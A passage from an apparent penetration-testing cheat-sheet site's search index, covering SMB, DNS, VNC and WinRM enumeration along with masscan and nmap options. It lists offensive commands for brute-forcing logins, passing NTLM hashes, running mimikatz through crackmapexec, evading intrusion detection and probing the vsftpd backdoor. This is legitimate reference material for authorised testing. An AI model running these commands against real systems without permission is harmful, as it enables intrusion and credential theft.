EternalBlue.</p>"},{"location":"Offensive-Security/Network/ports/445/#information-that-can-be-gained-through-smb-enumeration","title":"Information That Can Be Gained Through SMB Enumeration","text":"Category Information Gained Users and groups / shares List of users and groups, details of shared resources Operating system information OS version, system configuration, installed updates Password policies / Password hashes Password strength requirements, password expiration settings, hashed passwords Privileges / Permissions User and group permissions, administrative rights Available shares Network shares, access permissions, shared directories"},{"location":"Offensive-Security/Network/ports/445/#listing-smb-shares","title":"Listing SMB Shares","text":"Command Description <code>netexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --shares</code> List shares using specified username and password <code>netexec smb [IP-ADDRESS] -u guest -p '' --shares</code> List shares using guest access with no password <code>smbclient -N -L //[IP-ADDRESS]</code> List shares with Null session authentication. <code>crackmapexec smb [IP-ADDRESS] -u '' -p '' --shares</code> List shares with Null session authentication. Tips &amp; Tricks <p>If the <code>Admin$</code> SMB share has read and write permissions, you can run psexec to establish a connection to the target Windows machine</p>"},{"location":"Offensive-Security/Network/ports/445/#enumerating-smb-files","title":"Enumerating SMB Files","text":"Command Description <code>netexec smb [IP-ADDRESS] -u [USERNAME] -p [PASSWORD] -M spider_plus</code> Enumerates all files in a specified share using netexec with the spider_plus module. <code>crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p [PASSWORD] -M spider_plus --shares 'Specific Share'</code> then <code>cat /tmp/cme_spider_plus/[IP-ADDRESS].json \\| jq '. \\| map_values(keys)'</code> Enumerates all files in a specified share using CrackMapExec with the spider_plus module. <code>smbclient //[IP-ADDRESS]/[SHARE] -N</code> Connects to an SMB share using null authentication. <code>smbclient //[IP-ADDRESS]/[SHARE] -U [USERNAME] [PASSWORD]</code> Connects to an SMB share with the specified username and password. <code>smbclient.py '[DOMAIN]/[USERNAME]:[PASSWORD]@[IP/HOST] -k -no-pass</code> Connects to an SMB share using Kerberos authentication. Tips &amp; Tricks <p>If the <code>IPC$</code> share is accessible, it enables us to brute-force RIDs (Usernames).</p>"},{"location":"Offensive-Security/Network/ports/445/#smbclient-commands-to-download-all-files","title":"Smbclient Commands to Download All Files","text":"Command Description <code>smbclient //[IP-ADDRESS]/[SHARE] -U [USERNAME]</code> Connect to the SMB share at specified IP and share name. <code>mask \"\"</code> Clear any existing file mask to match all files. <code>recurse</code> Enable recursive mode to include subdirectories. <code>prompt</code> Disable interactive mode to avoid prompts for each file. <code>mget *</code> Download all files and directories from the share to the current directory."},{"location":"Offensive-Security/Network/ports/445/#user-enumeration","title":"User Enumeration","text":"Description Command Enumerate users <code>crackmapexec smb [TARGET-IP] -u 'user' -p 'PASS' --users</code> Perform RID Bruteforce to get users <code>crackmapexec smb [TARGET-IP] -u 'user' -p 'PASS' --rid-brute</code> Enumerate domain groups <code>crackmapexec smb [TARGET-IP] -u 'user' -p 'PASS' --groups</code> Enumerate local users <code>crackmapexec smb [TARGET-IP] -u 'user' -p 'PASS' --local-users</code>"},{"location":"Offensive-Security/Network/ports/445/#brute-forcing-smb-credentials","title":"Brute-Forcing SMB Credentials","text":"Scenario Command Unknown User <code>hydra -L user.txt -p \"Password\" -f [TARGET-IP] smb</code> Unknown Password <code>hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] smb</code> Unknown User and Password <code>hydra -L user.txt -P /opt/rockyou.txt -f [TARGET-IP] smb</code> With Domain <code>hydra -l user -P /opt/rockyou.txt -f -m Domain [TARGET-IP] smb</code>"},{"location":"Offensive-Security/Network/ports/445/#pass-the-hash-techniques","title":"Pass the Hash Techniques","text":"Technique Command psexec <code>crackmapexec smb [TARGET-IP] -u '[USERNAME]' -d '[DOMAIN]' -H ':[NTLM-HASH]' --shares</code> psexec (impacket) <code>impacket-psexec -hashes \":[NTLM-HASH]\" [DOMAIN].local/[USERNAME]@[TARGET-IP]</code> CME <code>evil-winrm -i [TARGET-IP] -u [USERNAME] -H [NTLM-HASH]</code>"},{"location":"Offensive-Security/Network/ports/445/#crackmapexec-commands","title":"CrackMapExec Commands","text":"Command Description <code>crackmapexec smb -L</code> Lists available SMB shares and their permissions. <code>crackmapexec [TARGET-IP] -u [USERNAME] -H [NTLM-HASH] --local-auth</code> Accesses SMB shares through local authentication with an NTLM hash. <code>crackmapexec smb --gen-relay-list smb-targets.txt [IP-ADDRESS/RANGE]</code> <code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'net group \"Domain Admins\" /domain'</code> Executes Windows commands over SMB to list Domain Admins. <code>crackmapexec smb [IP-ADDRESS/RANGE] -u '[USERNAME]' -p '[PASSWORD]' --local-auth -M mimikatz</code> Executes Mimikatz to extract credentials from SMB targets in the specified subnet. <code>crackmapexec smb [TARGET-IP] -u '[USERNAME]' -p '[PASSWORD]' --pass-pol</code> Extracts password policies"},{"location":"Offensive-Security/Network/ports/445/#nmap-enumeration-commands","title":"Nmap Enumeration Commands","text":"Nmap Script Description <code>nmap --script smb-* -p 139,445 [TARGET-IP]</code> Executes all SMB-related Nmap scripts against the specified IP address for a broad assessment. <code>nmap --script smb-enum-* -p 139,445 [TARGET-IP]</code> Executes all SMB enumeration scripts for detailed information on shares, users, sessions, etc. <code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [TARGET-IP]</code> Enumerates shares and user accounts on the target SMB server using specific NSE scripts."},{"location":"Offensive-Security/Network/ports/445/#list-of-nmap-smb-scripts","title":"List of Nmap SMB Scripts","text":"Script Name Explanation <code>smb-brute.nse</code> Performs brute-force password auditing against SMB servers. <code>smb-enum-domains.nse</code> Enumerates domains on an SMB server. <code>smb-enum-groups.nse</code> Enumerates groups on an SMB server. <code>smb-enum-processes.nse</code> Lists all processes on an SMB server. <code>smb-enum-services.nse</code> Lists all services on an SMB server. <code>smb-enum-sessions.nse</code> Enumerates active sessions on an SMB server. <code>smb-enum-shares.nse</code> Enumerates shared folders on an SMB server. <code>smb-enum-users.nse</code> Enumerates users on an SMB server. <code>smb-flood.nse</code> Performs a DoS (Denial of Service) against SMB by flooding it with bogus data. <code>smb-ls.nse</code> Lists files and directories on an SMB share. <code>smb-mbenum.nse</code> Enumerates Windows systems in the workgroup or domain using the browser service. <code>smb-os-discovery.nse</code> Attempts to discover the operating system version and build number over SMB. <code>smb-print-text.nse</code> Prints a text file on a remote shared printer. <code>smb-protocols.nse</code> Lists supported SMB protocols (SMB1, SMB2, SMB3) by the target server. <code>smb-psexec.nse</code> Executes commands on a remote system using SMB and PsExec. <code>smb-security-mode.nse</code> Checks the security mode (e.g., authentication level) of the SMB server. <code>smb-server-stats.nse</code> Retrieves server statistics, such as bytes transferred and file counts. <code>smb-system-info.nse</code> Gathers system information from the SMB server, including OS details, domain, and system uptime."},{"location":"Offensive-Security/Network/ports/53/","title":"53 - DNS","text":""},{"location":"Offensive-Security/Network/ports/53/#introduction","title":"Introduction","text":"<p>DNS (Domain Name System) translates human-friendly domain names (e.g., <code>www.example.com</code>) into IP addresses (e.g., <code>192.0.2.1</code>) that machines use to communicate. Acting as the internet\u2019s phone book, DNS enables users to access websites using names instead of IPs. It's built on a distributed, hierarchical system of servers to handle queries efficiently.</p>"},{"location":"Offensive-Security/Network/ports/53/#basic-dns-records-lookup","title":"Basic DNS records lookup","text":"<p>Tools and commands for retrieving DNS record information.</p> Tool Example Command Description nslookup <code>nslookup -type=A example.com</code> Queries a DNS server for A records (IPv4 addresses) or other types. dig <code>dig A example.com @ns1.example.com</code> Powerful DNS querying tool ideal for debugging and automation. host <code>host -t mx example.com</code> Simple tool to fetch various DNS record types, especially mail (MX) records. dnsrecon <code>dnsrecon -d example.com -t axfr</code> Python script used for DNS enumeration and zone transfer testing. dnsenum <code>dnsenum example.com</code> Perl-based tool that performs comprehensive DNS info gathering. nmap <code>nmap --script \"dns-*\" example.com</code> Runs Nmap DNS scripts to enumerate records and potential vulnerabilities."},{"location":"Offensive-Security/Network/ports/53/#dns-lookup-commands-by-record-type","title":"DNS lookup commands by record type","text":"<p>Query different types of DNS records to gather domain intelligence.</p> Record Type Command Description A (IPv4) <code>nslookup -type=A [DOMAIN]</code><code>dig A [DOMAIN] @[NAMESERVER]</code> Fetches the IPv4 address of a domain. AAAA (IPv6) <code>nslookup -type=AAAA [DOMAIN]</code><code>dig AAAA [DOMAIN] @[NAMESERVER]</code> Fetches the IPv6 address of a domain. PTR (Reverse) <code>nslookup -type=PTR [IP_ADDRESS]</code><code>dig -x [IP_ADDRESS] @[NAMESERVER]</code> Resolves an IP back to its domain name. ANY <code>nslookup -type=ANY [DOMAIN]</code><code>dig ANY [DOMAIN] @[NAMESERVER]</code> Attempts to return all available DNS records. TXT <code>nslookup -type=TXT [DOMAIN]</code><code>dig TXT [DOMAIN] @[NAMESERVER]</code> Retrieves text records used for SPF, verification, etc. MX (Mail) <code>nslookup -type=MX [DOMAIN]</code><code>dig MX [DOMAIN] @[NAMESERVER]</code> Identifies mail servers handling email for the domain."},{"location":"Offensive-Security/Network/ports/53/#dns-enumeration-techniques","title":"DNS enumeration techniques","text":"<p>Gain deeper insight into domain infrastructure and potential misconfigurations.</p> Technique Command Purpose DNS lookup <code>host [DOMAIN or IP_ADDRESS]</code> Retrieves default DNS record(s) for the domain or IP. Enumerate NS records <code>host -t ns [DOMAIN]</code> Lists name servers responsible for the domain. Identify MX records <code>host -t mx [DOMAIN]</code> Lists mail servers used by the domain. Zone transfer attempt <code>host -l [DOMAIN] [NAME_SERVER]</code> Attempts a zone transfer from a name server (often blocked). TXT record lookup <code>host -t txt [DOMAIN]</code> Finds domain text records, including SPF and verification entries. SOA record check <code>host -t soa [DOMAIN]</code> Gets domain\u2019s Start of Authority record. CNAME record check <code>host -t cname [ALIAS]</code> Resolves a canonical name (alias) for the domain. SRV record discovery <code>host -t srv _service._protocol.domain</code> Identifies service-specific records (e.g., <code>_sip._tcp.example.com</code>). DNSSEC key check <code>host -t dnskey [DOMAIN]</code> Checks for DNSSEC support and associated public keys."},{"location":"Offensive-Security/Network/ports/5900/","title":"5900 - VNC","text":""},{"location":"Offensive-Security/Network/ports/5900/#introduction","title":"Introduction","text":"<p>VNC (Virtual Network Computing) is a desktop sharing system that uses the RFB (Remote Frame Buffer) protocol to control another computer remotely. It transmits keyboard and mouse inputs and updates the graphical screen between computers over a network. VNC is platform-independent, supporting various operating systems, and is commonly used for technical support and remote file access.</p>"},{"location":"Offensive-Security/Network/ports/5900/#connecting-using-vnc-viewer","title":"Connecting Using VNC Viewer","text":"Command Description <code>vncviewer -passwd passwd.txt [TARGET-IP]::[PORT]</code> Connects to a VNC server using an IP and port with password authentication from a specified file."},{"location":"Offensive-Security/Network/ports/5900/#brute-forcing-vnc-credentials","title":"Brute-Forcing VNC Credentials","text":"Command Description <code>hydra -s 5900 -P /usr/share/wordlists/rockyou.txt -t 4 [TARGET-IP] vnc -V</code> This command Uses Hydra to crack VNC server passwords on port 5900 using the \"rockyou.txt\" password list, with detailed output. <code>hydra -s 5900 -L [PATH_TO_USERLIST] -P /usr/share/wordlists/rockyou.txt -t 4 [TAGER-IP] vnc -V</code> This command uses Hydra to perform a brute force attack on a VNC server, using a list of usernames and passwords on port 5900, with detailed output enabled. <code>medusa -h [TARGET-IP] -u [USERNAME] -P /usr/share/wordlists/rockyou.txt -M vnc -T 4 -v 4</code> This command uses Medusa to test VNC server logins at a specific IP address, using one username, multiple passwords, <code>ncrack -vv --user [USERNAME] -P /usr/share/wordlists/rockyou.txt vnc://[TARGET-IP]:5900</code> This command runs Ncrack to attempt a password crack on a VNC server using a specified username and password list, with high detail in the output."},{"location":"Offensive-Security/Network/ports/5900/#nmap","title":"Nmap","text":"Command Description <code>ls -la /usr/share/nmap/scripts \\| grep \"vnc\"</code> Displays a list of Nmap NSE scripts that are specifically designed for auditing VNC services. This is a quick way to select scripts appropriate for targeted security checks. <code>nmap -p 5900 --script vnc* [TARGET-IP]</code> This Nmap command scans port 5900 for VNC vulnerabilities and config details at the given IP address."},{"location":"Offensive-Security/Network/ports/5900/#popular-nse-scripts-for-vnc","title":"Popular NSE Scripts for VNC","text":"<p>Nmap Scripting Engine offers several scripts targeted at assessing VNC services. These scripts can help uncover potential security weaknesses:</p> Script Name Description <code>vnc-info.nse</code> Gathers extensive information about the VNC service, including the protocol version and security settings, to help in understanding how the server is configured. <code>vnc-brute.nse</code> Attempts to brute-force the password of a VNC server, providing insights into the robustness of the existing password policy. Usage <code>nmap [TARGET-IP] -Pn -sU -p 161 --script=[SCRIPT-NAME]</code>"},{"location":"Offensive-Security/Network/ports/5985/","title":"5985/5986 - WINRM","text":""},{"location":"Offensive-Security/Network/ports/5985/#introduction","title":"Introduction","text":"<p>WinRM (Windows Remote Management) is a protocol for remote management of Windows machines, It allows for secure communication over HTTP or HTTPS to perform tasks like running scripts and managing data remotely. Integrated into Windows, WinRM is essential for centralized management and automation in multi-server environments.</p>"},{"location":"Offensive-Security/Network/ports/5985/#connecting-to-winrm","title":"Connecting to WinRM","text":"Command Description <code>evil-winrm -i [TARGET-IP] -u [USERNAME] -p [PASSWORD]</code> Connects to a remote Windows server using evil-winrm,This command requires the IP address of the target machine and valid user credentials. <code>crackmapexec winrm [TARGET-IP] -u [USERNAME] -p [PASSWORD] -x \"whoami\"</code> Tests if a specific username and password combination can log in and execute a command to display the current user identity <code>crackmapexec winrm [TARGET-IP] -u [USERNAME] -H [HASH] -X '$PSVersionTable'</code> Uses a hash for authentication with a PowerShell command to verify access."},{"location":"Offensive-Security/Network/ports/5985/#brute-forcing-winrm-credentials","title":"Brute-Forcing WinRM Credentials","text":"TOOL Command CrackMapExec <code>crackmapexec winrm [TARGET-IP] -u [USERNAME-LIST] -p [PASSWORD-LIST] --continue-on-success</code> Hydra <code>hydra -L [USERNAME-LIST] -P [PASSWORD-LIST] [TARGET-IP] winrm -V</code> Metasploit <code>auxiliary/scanner/winrm/winrm_login</code> Ncrack <code>ncrack -p 5985 -u [USERNAME-LIST] -P [PASSWORD-LIST] [TARGET-IP]</code> Warning <p>Be cautious with brute-forcing WinRM, As it may lead to user account lockouts.</p>"},{"location":"Offensive-Security/Network/ports/Readme/","title":"Readme","text":""},{"location":"Offensive-Security/Network/ports/Readme/#investigating-unrecognized-open-ports","title":"Investigating Unrecognized Open Ports","text":"<p>Identifying an unrecognized open port during penetration testing might provide a potential entry point .This guide provides straightforward steps to understand and inspect these ports.</p>"},{"location":"Offensive-Security/Network/ports/Readme/#step-1-identifying-service-details","title":"Step 1. Identifying Service Details","text":"<ol> <li>Port Information Database: Use a port information database to identify the common services associated with the port. A reliable source is SpeedGuide. <code>https://www.speedguide.net/port.php?port=[PORT]</code>     Replace <code>[PORT]</code> with the actual number of the port you are investigating.</li> <li>Banner Grabbing: Use tools like Telnet, Netcat to extract banners from open services, which often include the type and version of the service running. For example:<ol> <li><code>telnet [TARGET-IP] [PORT]</code></li> <li><code>nc -v [TARGET-IP] [PORT]</code></li> </ol> </li> </ol>"},{"location":"Offensive-Security/Network/ports/Readme/#step-2-check-for-common-vulnerabilities","title":"Step 2: Check for Common Vulnerabilities","text":"<p>Once you have identified which service is running on the port, use a combination of search techniques to identify any known vulnerabilities associated with it.</p> <ol> <li>Query well-known vulnerability databases and blogs: <code>site:exploit-db.com | site:github.com | site:0xdf.gitlab.io \"[Software Name] [version]\"</code></li> <li> <p>Search to find any known exploits or vulnerabilities: <code>\"[Service Name] [version]\" +exploit | vulnerability</code></p> Tips &amp; Tricks <p>Prioritize sources from ExploitDB/Github/Rapid7.</p> </li> <li> <p>Search for any patches, updates, or changelogs that might indicate security fixes:    <code>\"[Service Name] [version]\" +patch | update | changelog</code> </p> </li> </ol>"},{"location":"Offensive-Security/Network/ports/Readme/#step-3-learn-from-practical-examples-and-tutorials","title":"Step 3: Learn from Practical Examples and Tutorials","text":"<p>If you are unfamiliar with how to exploit a found vulnerability, consider learning from practical examples and tutorials. Excellent resources for walkthroughs and tutorials include:</p> <ol> <li>Search for relevant videos by entering the software name. <code>https://ippsec.rocks/</code></li> <li>Use tags to find detailed walkthroughs. <code>https://0xdf.gitlab.io/tags</code></li> </ol>"},{"location":"Offensive-Security/Network/ports/Readme/#step-4-additional-tools-and-techniques","title":"Step 4: Additional Tools and Techniques","text":"<ol> <li>Nmap Scripting Engine (NSE): Use NSE scripts to gather more information and potentially identify vulnerabilities automatically. For example: <code>nmap -sV --script vuln [TARGET-IP] -p [PORT-NUMBER]</code></li> <li>Shodan and Censys: Use scanners like Shodan and Censys to find similar services on other systems and see if they are known to be vulnerable.<ol> <li>Shodan</li> <li>Censys</li> </ol> </li> </ol>"},{"location":"Offensive-Security/Network/tools/masscan/","title":"Masscan","text":""},{"location":"Offensive-Security/Network/tools/masscan/#overview","title":"Overview","text":"<p>Masscan is a high-speed port scanner built for Internet-scale reconnaissance. It sends packets like Nmap but is much faster. Use it to map large networks, identify exposed services, and narrow targets before deeper scans.</p>"},{"location":"Offensive-Security/Network/tools/masscan/#target-selection","title":"Target Selection","text":"Option Example Description (none) <code>masscan 192.168.1.10</code> Scan a single IP address. (none) <code>masscan 192.168.1.10 192.168.1.20</code> Scan multiple IPs separated by spaces. (none) <code>masscan 192.168.1.10-192.168.1.100</code> Scan an IP range (inclusive). (none) <code>masscan example.com</code> Resolve and scan a domain name. (none) <code>masscan 10.0.0.0/8</code> Scan a subnet using CIDR notation. <code>-iL</code> <code>masscan -iL targets.txt</code> Load a list of targets from a text file (one per line). <code>--exclude</code> <code>masscan --exclude 192.168.1.1</code> Exclude specific IPs from scanning (useful to avoid internal or sensitive systems). <code>--excludefile</code> <code>masscan --excludefile exclude.txt</code> Load exclusions from a file (one IP or CIDR per line)."},{"location":"Offensive-Security/Network/tools/masscan/#scan-rate-performance","title":"Scan Rate &amp; Performance","text":"Option Example Description <code>--rate</code> <code>masscan --rate 10000</code> Controls packets per second. Start low for stealth. Raise for speed. Defaults to 100 packets/sec if not set. <code>--top-ports</code> <code>masscan --top-ports 100</code> Scans the most commonly used 100 TCP ports based on global traffic data. Faster recon than full port scans. <code>--max-rate</code> <code>masscan --max-rate 5000</code> (Alias) Same as <code>--rate</code>. Useful when scripting or integrating. <code>--adapter-ip</code> <code>masscan --adapter-ip 192.168.1.100</code> Sets the source IP if scanning from a system with multiple interfaces or IPs. <code>--adapter-port</code> <code>masscan --adapter-port 40000</code> Sets the source port range to use for packets. Helps avoid firewall detection or port conflicts."},{"location":"Offensive-Security/Network/tools/masscan/#port-scanning-options","title":"Port Scanning Options","text":"Option Example Description <code>-p</code> <code>masscan -p80,443 10.0.0.1</code> Scan specific ports on a host. Useful for targeting known services. <code>-p</code> <code>masscan -p0-65535 10.0.0.1</code> Full TCP port scan. Use only when you need full visibility (can take longer). <code>--ports</code> <code>masscan --ports 21,22,23,80,443</code> Alternate way to define ports. Can help when scripting. <code>--banners</code> <code>masscan --banners</code> Attempt to grab service banners (like version strings). Requires open port and banner support. Slower, use with <code>--rate</code> throttling."},{"location":"Offensive-Security/Network/tools/masscan/#output-formats","title":"Output Formats","text":"Option Example Description <code>-oJ</code> <code>masscan -p80 1.2.3.4 -oJ output.json</code> Saves results as JSON. Useful for parsing or automation. <code>-oX</code> <code>masscan -p80 1.2.3.4 -oX output.xml</code> XML output, compatible with many tools (like Metasploit, Nmap GUIs, etc). <code>--output-format list</code> <code>masscan --output-format list</code> Simple text format like <code>IP:port</code>. Useful for piping into other tools or quick review."},{"location":"Offensive-Security/Network/tools/masscan/#workflow-example","title":"Workflow Example","text":"<pre><code># Fast recon of top 100 ports on a /16 subnet\nmasscan 192.168.0.0/16 --top-ports 100 --rate 5000 -oJ scan.json\n\n# Targeted scan of known ports with exclusions\nmasscan -p22,80,443 -iL targets.txt --exclude 192.168.1.1 --rate 1000 -oX results.xml\n\n# Full port scan on one host for deeper analysis\nmasscan 10.0.0.5 -p0-65535 --rate 2000 -oJ fullscan.json\n</code></pre>"},{"location":"Offensive-Security/Network/tools/nmap/","title":"Nmap","text":""},{"location":"Offensive-Security/Network/tools/nmap/#overview","title":"Overview","text":"<p>Nmap (Network Mapper) is a free and open-source tool used for network discovery and security auditing. It is widely used to identify what devices are running on a network, discover open ports, detect security risks, and map network infrastructure.</p> <pre><code># Full TCP port scan with high rate\nnmap -p- --min-rate 10000 [TARGET-IP] -oN ports.nmap\n\n# Extract open ports as comma-separated list\ncat ports.nmap | grep 'open' | awk '{ print $1 }' | awk '{print ($0+0)}' | sed -z 's/\\n/,/g;s/,$/\\n/'\n\n# Run default scripts and version detection on specific ports\nnmap -p [PORT,PORT,PORT] -sCV [TARGET-IP] -oN Final.nmap\n</code></pre>"},{"location":"Offensive-Security/Network/tools/nmap/#target-specification","title":"Target Specification","text":"Option Example Description <code>nmap [IP-ADDRESS]</code> Scan a single IP to identify open ports and associated services. <code>nmap [IP-ADDRESS] [IP-ADDRESS]</code> Scan a two specified IP addresses to identify open ports and associated services. <code>nmap [IP-ADDRESS/RANGE]</code> Scan an entire subnet to identify open ports and associated services. <code>nmap [DOMAIN-NAME]</code> Scan a domain to resolve and assess services hosted publicly. <code>-iL</code> <code>nmap -iL [TARGETS].txt</code> Import a list of targets from a file, useful for organized sequential scans. <code>-iR</code> <code>nmap -iR 100</code> Randomly scan 100 hosts to discover potentially vulnerable systems. <code>--exclude</code> <code>nmap --exclude [IP-ADDRESS]</code> Exclude specific hosts from scan to focus on untested systems."},{"location":"Offensive-Security/Network/tools/nmap/#scan-techniques","title":"Scan Techniques","text":"Option Example Description <code>-sS</code> <code>nmap [IP-ADDRESS] -sS</code> Executes a stealth SYN scan to discreetly identify active ports without finalizing the TCP handshake. <code>-sT</code> <code>nmap [IP-ADDRESS] -sT</code> Use a TCP connect scan to check port availability through full TCP handshake (less stealthy). <code>-sU</code> <code>nmap [IP-ADDRESS] -sU</code> Probe UDP ports, which are often less monitored and can reveal services like DNS, SNMP, or DHCP. <code>-sA</code> <code>nmap [IP-ADDRESS] -sA</code> Conduct an ACK scan to map out firewall rules regarding stateful inspection and filtered ports. <code>-sW</code> <code>nmap [IP-ADDRESS] -sW</code> Use a TCP Window scan to infer window size and detect potential for denial-of-service vulnerabilities. <code>-sM</code> <code>nmap [IP-ADDRESS] -sM</code> Implement a Maimon scan to explore peculiarities in TCP stack implementations."},{"location":"Offensive-Security/Network/tools/nmap/#host-discovery","title":"Host Discovery","text":"Option Example Description <code>-sL</code> <code>nmap 192.168.1.1-3 -sL</code> Lists network hosts without sending packets, useful for network inventories. <code>-sn</code> <code>nmap [IP-ADDRESS/RANGE] -sn</code> Ping scan to identify which hosts are up. <code>-Pn</code> <code>nmap 192.168.1.1-5 -Pn</code> Assumes all hosts are live, useful when hosts block ping requests. <code>-PS</code> <code>nmap 192.168.1.1-5 -PS22-25,80</code> Use TCP SYN packets to lightly probe specified ports and detect responsive hosts. <code>-PA</code> <code>nmap 192.168.1.1-5 -PA22-25,80</code> Sends TCP SYN packets to specified ports to infer active hosts. <code>-PU</code> <code>nmap 192.168.1.1-5 -PU53</code> Sends UDP packets to the specified port to check for host responses. <code>-PR</code> <code>nmap 192.168.1.1-1/24 -PR</code> Uses ARP to find active hosts within a local network segment. <code>-n</code> <code>nmap 192.168.1.1 -n</code> Disables DNS resolution to speed up the scan."},{"location":"Offensive-Security/Network/tools/nmap/#port-specification","title":"Port Specification","text":"Option Example Description <code>-p</code> <code>nmap [IP-ADDRESS] -p [PORT]</code> Scan a specific port to check for services like FTP and potential misconfigurations. <code>-p</code> <code>nmap [IP-ADDRESS] -p [FROM-PORT]-[TO-PORT]</code> Scan a range of ports to uncover a wider array of services and their states. <code>-p</code> <code>nmap [IP-ADDRESS] -p U:[PORT],T:[PORT]-[PORT],[PORT]</code> Scan both TCP and UDP ports to gather comprehensive details about network services. <code>-p</code> <code>nmap [IP-ADDRESS] -p-</code> Perform a full port scan to thoroughly assess all potential points of network entry. <code>-p</code> <code>nmap [IP-ADDRESS] -p http,https</code> Target specific service ports based on protocol names to focus on web services. <code>-F</code> <code>nmap [IP-ADDRESS] -F</code> Conduct a fast scan of top 100 most common ports, ideal for initial reconnaissance. <code>--top-ports</code> <code>nmap [IP-ADDRESS] --top-ports 2000</code> Scan the top 2000 most common ports for a broad yet efficient overview of network exposure. <code>-p-65535</code> <code>nmap [IP-ADDRESS] -p-65535</code> Scan from port 1 through 65535 to explore less commonly used ports. <code>-p0-</code> <code>nmap [IP_ADDRESS] -p0-</code> Start from port 0 to include all possible ports in the scan up to 65535."},{"location":"Offensive-Security/Network/tools/nmap/#service-and-version-detection","title":"Service and Version Detection","text":"Option Example Description <code>-sV</code> <code>nmap [IP-ADDRESS] -sV</code> Detects service versions running on open ports. <code>-sV --version-intensity</code> <code>nmap [IP-ADDRESS] -sV --version-intensity 8</code> Sets the intensity of version detection to level 8, balancing thoroughness and speed. <code>-sV --version-light</code> <code>nmap [IP-ADDRESS] -sV --version-light</code> Uses a lighter version detection mode for faster scanning. <code>-sV --version-all</code> <code>nmap [IP-ADDRESS] -sV --version-all</code> Forces Nmap to use the most aggressive version detection. <code>-A</code> <code>nmap [IP-ADDRESS] -A</code> Enables OS detection, version detection, script scanning, and traceroute."},{"location":"Offensive-Security/Network/tools/nmap/#os-detection","title":"OS Detection","text":"Option Example Description <code>-O</code> <code>nmap [IP-ADDRESS] -O</code> Detects the operating system of the host. <code>-O --osscan-limit</code> <code>nmap [IP-ADDRESS] -O --osscan-limit</code> Limits OS detection to confirmed open and closed ports for faster scanning. <code>-O --osscan-guess</code> <code>nmap [IP-ADDRESS] -O --osscan-guess</code> Makes an educated guess about the OS when detection is uncertain. <code>-O --max-os-tries</code> <code>nmap [IP-ADDRESS] -O --max-os-tries 1</code> Limits the number of OS detection tries to speed up the process. <code>-A</code> <code>nmap [IP-ADDRESS] -A</code> Enables comprehensive scanning, including OS detection, service version detection, script scanning, and traceroute."},{"location":"Offensive-Security/Network/tools/nmap/#timing-and-performance","title":"Timing and Performance","text":"Option Example Description <code>-T0</code> <code>nmap [IP-ADDRESS] -T0</code> Paranoid timing: extremely slow, used to evade intrusion detection systems. <code>-T1</code> <code>nmap [IP-ADDRESS] -T1</code> Sneaky timing: very slow, reduces the chance of detection. <code>-T2</code> <code>nmap [IP-ADDRESS] -T2</code> Polite timing: limits bandwidth use to avoid network disruption. <code>-T3</code> <code>nmap [IP-ADDRESS] -T3</code> Normal timing: balances speed and stealth, suitable for routine scans. <code>-T4</code> <code>nmap [IP-ADDRESS] -T4</code> Aggressive timing: faster scanning that may be detected by modern IDS. <code>-T5</code> <code>nmap [IP-ADDRESS] -T5</code> Insane timing: very fast but likely to be detected and can overload network resources."},{"location":"Offensive-Security/Network/tools/nmap/#timing-and-performance_1","title":"Timing and Performance","text":"Option Example Description <code>-f</code> <code>nmap [IP-ADDRESS] -f</code> Fragments packets to help hide the scan from firewalls and intrusion detection systems. <code>--mtu</code> <code>nmap [IP-ADDRESS] --mtu 32</code> Sets a custom MTU to fragment packets, helping to evade network filters. <code>-D</code> <code>nmap -D 192.168.1.101,192.168.1.102,192.168.1.103 192.168.1.1</code> Uses fake IP addresses during the scan to make the real scanning source harder to detect. <code>-S</code> <code>nmap -S www.microsoft.com www.example.com</code> Spoofs the scan\u2019s source IP to mimic another host, confusing defenses that rely on IP recognition. <code>-g</code> <code>nmap -g 53 [IP-ADDRESS]</code> Specifies a source port for scanning, which can help avoid detection by port-specific rules. <code>--proxies</code> <code>nmap --proxies http://[IP-ADDRESS]:[PORT], http://[IP-ADDRESS]:[PORT] [IP-ADDRESS]</code> Routes the scan through proxies to hide the scanner's true IP and avoid network monitoring. <code>--data-length</code> <code>nmap --data-length 200 [IP-ADDRESS]</code> Adds extra random data to the scan packets, disrupting detection by systems that recognize scan patterns."},{"location":"Offensive-Security/Network/tools/nmap/#nse-scripts","title":"NSE Scripts","text":"Option Example Description <code>-sC</code> <code>nmap [IP-ADDRESS] -sC</code> Runs default scripts for quick vulnerability scans and service identification. <code>--script default</code> <code>nmap [IP-ADDRESS] --script default</code> Executes all default scripts to comprehensively assess network security. <code>--script</code> <code>nmap [IP-ADDRESS] --script=banner</code> Captures service banners to identify software versions and potential vulnerabilities. <code>--script</code> <code>nmap [IP-ADDRESS] --script=http*</code> Targets all HTTP-related scripts to explore web services in depth. <code>--script</code> <code>nmap [IP-ADDRESS] --script=http,banner</code> Combines HTTP and banner scripts for detailed service analysis. <code>--script-args</code> <code>nmap --script snmp-sysdescr --script-args snmpcommunity=admin [IP-ADDRESS]</code> Runs the 'snmp-sysdescr' script with specified arguments to retrieve system descriptions from SNMP-enabled devices."},{"location":"Offensive-Security/Network/tools/nmap/#output-options","title":"Output Options","text":"Option Example Description <code>-oN</code> <code>nmap [IP-ADDRESS] -oN normal.file</code> Saves the scan results in a normal, human-readable format to the specified file. <code>-oX</code> <code>nmap [IP-ADDRESS] -oX xml.file</code> Outputs the scan results in XML format, suitable for parsing by software or further processing. <code>-oG</code> <code>nmap [IP-ADDRESS] -oG grep.file</code> Writes the scan results in a format easily usable with Unix grep command, ideal for automated processing. <code>-oA</code> <code>nmap [IP-ADDRESS] -oA results</code> Saves the scan results in all available formats (normal, XML, and grepable) to the specified base filename. <code>--append-output</code> <code>nmap [IP-ADDRESS] --append-output</code> Appends the results to existing files rather than overwriting them, useful for continuous scanning operations. <ol> <li><code>ls /usr/share/nmap/scripts/ftp*</code></li> <li><code>nmap --script ftp-vsftpd-backdoor -p 21 10.129.159.8</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Apache-Tomcat/","title":"Apache Tomcat","text":""},{"location":"Offensive-Security/Web-Application/Common-Applications/Apache-Tomcat/#introduction","title":"Introduction","text":"<p>Apache Tomcat is an open-source Java servlet container and web server, it's a key target due to its role in hosting Java-based web applications, often presenting opportunities to exploit configuration flaws and known 